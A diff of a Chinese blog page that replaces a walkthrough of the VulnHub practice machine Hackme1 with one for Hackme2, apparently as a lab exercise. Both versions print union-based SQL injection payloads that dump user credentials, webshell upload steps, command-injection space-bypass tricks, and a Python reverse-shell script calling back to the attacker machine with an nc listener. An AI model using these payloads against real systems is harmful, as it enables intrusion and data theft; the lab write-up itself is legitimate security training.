@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="靶机-Hackeme1, Liduan0">
-    <meta name="description" content="打靶Hackme1的流程">
+    <meta name="keywords" content="靶机-Hackme2, Liduan0">
+    <meta name="description" content="打靶Hackme2的流程">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>靶机-Hackeme1 | Liduan0</title>
+    <title>靶机-Hackme2 | Liduan0</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -312,12 +312,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">靶机-Hackeme1</h1>
+                    <h1 class="description center-align post-title">靶机-Hackme2</h1>
                 </div>
             </div>
         </div>
@@ -379,7 +379,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    758
+                    832
                 </div>
                 
 
@@ -405,135 +405,73 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p><strong>备注：</strong>文章是从自己csdn博客上移过来的，图片中可能存在水印的情况</p>
-<h3 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1. 环境配置"></a>1. 环境配置</h3><p>1.1 Hackeme1下载位置</p>
+<h1 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h1><p>靶机下载</p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://vulnhub.com/entry/hackme-1,330/">hackme: 1 ~ VulnHub</a></p>
+<p><a target="_blank" rel="noopener" href="https://vulnhub.com/entry/hackme-2,618/">hackme: 2 ~ VulnHub</a></p>
 </blockquote>
-<p>1.2 环境相关信息</p>
-<pre class="line-numbers language-none"><code class="language-none">kali攻击机：192.168.12.144
-靶机：192.168.12.162<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">攻击机kali：192.168.12.144
+靶机：192.168.12.163<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h3><p>2.1 进行主机发现，发现靶机<code>IP：192.168.12.162</code>,同时开放80端口。</p>
-<pre class="line-numbers language-none"><code class="language-none">nmap 192.168.12.1&#x2F;24
-arp-scan -l <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h1 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h1><ol>
+<li>主机发现，发现主机<code>ip:192.168.12.163</code><pre class="line-numbers language-none"><code class="language-none">namp 192.168.12.1&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/post/ed54/2-1.jpg" class>
+2.发现端口80，22端口开放；对80端口进行访问</li>
+</ol>
+<img src="/post/ed54/2-2.jpg" class>
 
-<img src="/post/b990/21.png" class>
-
-<p>2.2 访问靶机的80端口，一个登录页面。</p>
-<img src="/post/b990/2-2.jpg" class>
-
-<p>2.3 对网站进行目录扫描</p>
-<p>（1）利用dirb工具对网站进行扫描。</p>
-<pre class="line-numbers language-none"><code class="language-none">dirb http:&#x2F;&#x2F;192.168.12.162&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<img src="/post/b990/2-3.jpg" class>
-
-<p>（2）利用dirsearch工具对网站进行扫描</p>
-<pre class="line-numbers language-none"><code class="language-none">dirsearch -u &quot;http:&#x2F;&#x2F;192.168.12.162&#x2F;&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<img src="/post/b990/2-4.jpg" class>
-
-<p>（3）利用gobuster工具对网站进行扫描</p>
-<pre class="line-numbers language-none"><code class="language-none">gobuster dir -e -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt -u http:&#x2F;&#x2F;192.168.12.162
-#-w 指定字典；-u 指定网站；-x 指定文件的后缀<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<img src="/post/b990/2-5.jpg" class>
-
-<h3 id="3-漏洞挖掘"><a href="#3-漏洞挖掘" class="headerlink" title="3. 漏洞挖掘"></a>3. 漏洞挖掘</h3><p>3.1 发现登录页面，进行查看发现可以注册用户</p>
-<img src="/post/b990/3-1.jpg" class>
-
-<p>3.2 进入注册页面，注册个用户</p>
-<img src="/post/b990/3-2.jpg" class>
-
-<p>3.3 通过注册的用户进行登录，点击search，发现一些数据。</p>
-<img src="/post/b990/3-3.jpg" class>
-
-<p>3.4 对搜索框进行sql注入，存在单引号的字符注入。</p>
-<pre class="line-numbers language-none"><code class="language-none">### 输入：
-Linux OS   &#x2F;&#x2F;正常
-Linux OS&#39; &#x2F;&#x2F;不正常
-Linux OS&#39; and 1&#x3D;1 # &#x2F;&#x2F;正常
-Linux OS&#39; and 1&#x3D;2 # &#x2F;&#x2F;不正常<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<img src="/post/b990/3-4.jpg" class>
-
-<img src="/post/b990/3-5.jpg" class>
-
-<p>3.5 判断字段数，根据判断字段数为3。</p>
-<pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; order by 1#          &#x2F;&#x2F;正常
-Linux OS&#39; order by 4#         &#x2F;&#x2F;不正常
-Linux OS&#39; order by 3#         &#x2F;&#x2F;正常<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<img src="/post/b990/3-6.jpg" class>
-
-<img src="/post/b990/3-7.jpg" class>
-
-<p>3.6 判断注入的位置</p>
-<pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; and 1&#x3D;2 union select 11,22,33#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<img src="/post/b990/3-8.jpg" class>
-
-<p>3.7 爆破数据库名，用户名，版本号</p>
-<pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; and 1&#x3D;2 union select database(),user(),version()#
-数据库名为：webapphacking<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<img src="/post/b990/3-9.jpg" class>
-
-<p>3.8 爆数据库中的表名</p>
-<pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; and 1&#x3D;2 union select 1, group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;webapphacking&#39;#
-表名：books,users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<img src="/post/b990/3-10.jpg" class>
-
-<p>3.9 爆字段名</p>
-<pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; and 1&#x3D;2 union select 1, group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<img src="/post/b990/3-11.png" class>
-
-<p>3.10 爆字段内的信息user\pasword</p>
-<pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; and 1&#x3D;2 union select group_concat(user),group_concat(pasword),3 from users#
-用户：superadmin
-密码：2386acb2cf356944177746fc92523983<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<img src="/post/b990/3-12.jpg" class>
-
-<p>3.11 利用md5破解网站对密码进行破解</p>
+<p>3.对站点目录进行扫描</p>
+<pre class="line-numbers language-none"><code class="language-none">dirsearch -u &quot;http:&#x2F;&#x2F;192.168.12.163&#x2F;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/dab04e25c70b4dc09f395f81921d4dda.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/699a79f592394ef386c760a895ec9194.png" alt="在这里插入图片描述"><br>4.网站指纹识别</p>
+<pre class="line-numbers language-none"><code class="language-none">whatweb http:&#x2F;&#x2F;192.168.12.163<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/2abef7949fbc4b2d960e5fc3b5e00c32.png" alt="在这里插入图片描述"></p>
+<h1 id="3-漏洞挖掘"><a href="#3-漏洞挖掘" class="headerlink" title="3.漏洞挖掘"></a>3.漏洞挖掘</h1><p>1.通过注册登录进入<br><img src="https://img-blog.csdnimg.cn/b2689e6d87914e0cacaa7c3ac50eae13.png" alt="在这里插入图片描述"><br>2.可能存在sql注入，用sqlmap失败，进行手工注入</p>
 <blockquote>
-<p>破解网站：</p>
-<p><a target="_blank" rel="noopener" href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p>
+<p>输入：<br>L   –&gt;返回信息			猜测这里存在模糊查询<br>Linux%’ and ‘123’ like ‘1   -&gt;成功返回信息</p>
 </blockquote>
-<img src="/post/b990/3-13.jpg" class>
-
-<p>3.12 利用解密的账号密码登录，发现文件上传</p>
-<img src="/post/b990/3-14.jpg" class>
-
-<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h3><p>4.1 直接上传木马文件—》成功</p>
-<img src="/post/b990/4-1.jpg" class>
-
-<p>4.2 访问页面，蚁剑连接</p>
-<img src="/post/b990/4-2.jpg" class>
-
-<img src="/post/b990/4-3.jpg" class>
-
-<p>4.3 编写反弹shell的脚本，shell.py，并利用蚁剑上传并执行</p>
-<pre class="line-numbers language-none"><code class="language-none">import socket,subprocess,os
-s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((&quot;192.168.12.144&quot;,8989))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>4.4 kali攻击机开启 端口监听</p>
-<img src="/post/b990/4-4.jpg" class>
-
-<p>4.5 执行反弹脚本,kali上接受反弹的shell</p>
-<img src="/post/b990/4-5.jpg" class>
-
-<img src="/post/b990/4-6.jpg" class>
-
-<h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>5.1 在&#x2F;home&#x2F;legacy路径下发现<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E4%BA%8C%E8%BF%9B%E5%88%B6&spm=1001.2101.3001.7020">二进制</a>文件touchmenot，执行二进制文件</p>
-<img src="/post/b990/5-1.jpg" class>
+<p>3.构造payload进行注入，爆破数据库</p>
+<pre class="line-numbers language-none"><code class="language-none">Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;database&#x2F;**&#x2F;(),&#39;2&#39;,&#39;3
+发现数据库：webapp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/58dd571c2bc7492496293354ceebcc98.png" alt="在这里插入图片描述"><br>4.继续爆破表名，字段名，字段内的数据</p>
+<pre class="line-numbers language-none"><code class="language-none">表名：Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(table_name),&quot;2&quot;,&quot;3&quot;&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#39;webapp
+字段名：
+Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(column_name),&quot;2&quot;,&quot;3&quot;&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x2F;**&#x2F;like&#x2F;**&#x2F;&#39;users
+字段内数据：
+Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(user),&#39;2&#39;,group_concat(pasword)&#x2F;**&#x2F;from&#x2F;**&#x2F;users&#x2F;**&#x2F;where&#x2F;**&#x2F;1&#x2F;**&#x2F;like&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/a8490e38ef0d46e696a9c9b148b95118.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/44ebb7713da540c38e5740b4b6bd296c.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/085bd47e98124d619b5d235e2ec41f65.png" alt="在这里插入图片描述"><br>5.根据上面获取的用户密码，利用前面md5破解网站破解密码</p>
+<blockquote>
+<p>用户：superadmin<br>密码：2386acb2cf356944177746fc92523983<br>破解：Uncrackable</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/b4b15f3f61214159ad94675b63f60f3f.png" alt="在这里插入图片描述"><br>6.利用破解的密码，进行登录<br><img src="https://img-blog.csdnimg.cn/cbd0c30d659044be93c46ce00119925d.png" alt="在这里插入图片描述"><br>7.进行文件上传漏洞的尝试</p>
+<blockquote>
+<p>直接上传木马文件 —-》失败<br>修改后缀为jpg —&gt;访问失败–蚁剑连接不上<br>上传的jpg，利用bp进行修改后缀，上传显示成功，页面访问失败</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/5e50329bbfb14fc9b953d65773c9b1b7.png" alt="在这里插入图片描述"><br>8.尝试命令注入漏洞</p>
+<p><img src="https://img-blog.csdnimg.cn/f3b3f62bf87a432289b76f8ff962866d.png" alt="在这里插入图片描述"><br>9.填写数据，利用bp抓包，修改数据</p>
+<blockquote>
+<p>system(‘ls’)</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/e5eaa0318de94f9cad6cbc4fedbec076.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/af27a02846f943b69458203a52fabea8.png" alt="在这里插入图片描述"><br>10.查看文件上传php文件</p>
+<blockquote>
+<p>cat${IFS}welcomeadmin.php<br>文件上传的路径为：&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;<br><img src="https://img-blog.csdnimg.cn/4aea0b14fcf44ac681f1c323e9c793f6.png" alt="在这里插入图片描述"></p>
+</blockquote>
+<p>命令执行中空格绕过方法</p>
+<blockquote>
+<p>&lt;  		 –&gt;   重定向，如cat&lt;flag.php<br>&lt;&gt;       –&gt;   重定向，如cat&lt;&gt;flag.php<br>%09 	 –&gt;   需要php环境，如cat%09flag.php<br>${IFS}	 –&gt;   单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名，如cat${IFS2}flag.php<br>$IFS$9 	 –&gt;   后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php</p>
+</blockquote>
+<h1 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h1><p>1.结合命令执行漏洞和文件上传漏洞，将前面上传的inj.jpg转换成phin.php文件，再使用蚁剑进行连接</p>
+<blockquote>
+<p>system(‘mv${IFS}&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;inj.jpg${IFS}&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;phin.php’)</p>
+</blockquote>
+<p>访问页面<br><img src="https://img-blog.csdnimg.cn/f7499f9506374c5f917dc9387dd16d49.png" alt="在这里插入图片描述"><br>蚁剑进行连接<br><img src="https://img-blog.csdnimg.cn/b1bfda1485f44d758eba09b007f37043.png" alt="在这里插入图片描述"><br>2.利用脚本,通过蚁剑上传执行</p>
+<blockquote>
+<p>import socket,subprocess,os<br>s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((“192.168.12.144”,8989))<br>os.dup2(s.fileno(),0)<br>os.dup2(s.fileno(),1)<br>os.dup2(s.fileno(),2)<br>p&#x3D;subprocess.call([“&#x2F;bin&#x2F;bash”,”-i”])</p>
+</blockquote>
+<p>3.kali开启监听</p>
+<blockquote>
+<p>nc -lvvp 8989</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/58878aa7e38b4a5595e6ac09966261e4.png" alt="在这里插入图片描述"></p>
+<h1 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h1><p>1.在&#x2F;home&#x2F;legacy路径下发现二进制文件touchmenot，执行二进制文件<br><img src="https://img-blog.csdnimg.cn/81c55c6af3994e97b8bdd815c27a1fe4.png" alt="在这里插入图片描述"></p>
 
                 
             </div>
@@ -550,7 +488,7 @@ p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;])<span ar
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Liduan0</a>
+                    <a href="/about" rel="external nofollow noreferrer">liduan0</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -560,7 +498,7 @@ p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;])<span ar
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://liduan0.github.io/post/b990.html">https://liduan0.github.io/post/b990.html</a>
+                    <a href="https://liduan0.github.io/post/ed54.html">https://liduan0.github.io/post/ed54.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -573,7 +511,7 @@ p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;])<span ar
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Liduan0</a>
+                    <a href="/about" target="_blank">liduan0</a>
                     !
                 </span>
             </div>
@@ -682,9 +620,10 @@ p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;])<span ar
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/post/ed54.html">
                     <div class="card-image">
@@ -702,9 +641,9 @@ p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;])<span ar
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-01
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-01
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -717,6 +656,7 @@ p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;])<span ar
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -739,19 +679,19 @@ p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;])<span ar
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/post/2c1.html">
+                <a href="/post/b990.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="Hexo搭建博客">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="靶机-Hackeme1">
                         
-                        <span class="card-title">Hexo搭建博客</span>
+                        <span class="card-title">靶机-Hackeme1</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            主要就是利用hexo搭建博客和遇到的一些问题和解决方法
+                            打靶Hackme1的流程
                         
                     </div>
                     <div class="publish-info">
@@ -762,8 +702,8 @@ p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;])<span ar
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/blog/" class="post-category">
-                                    blog
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                    靶机
                                 </a>
                             
                             
@@ -773,8 +713,12 @@ p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;])<span ar
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/blog/">
-                        <span class="chip bg-color">blog</span>
+                    <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">靶机</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%BD%91%E5%AE%89/">
+                        <span class="chip bg-color">网安</span>
                     </a>
                     
                 </div>
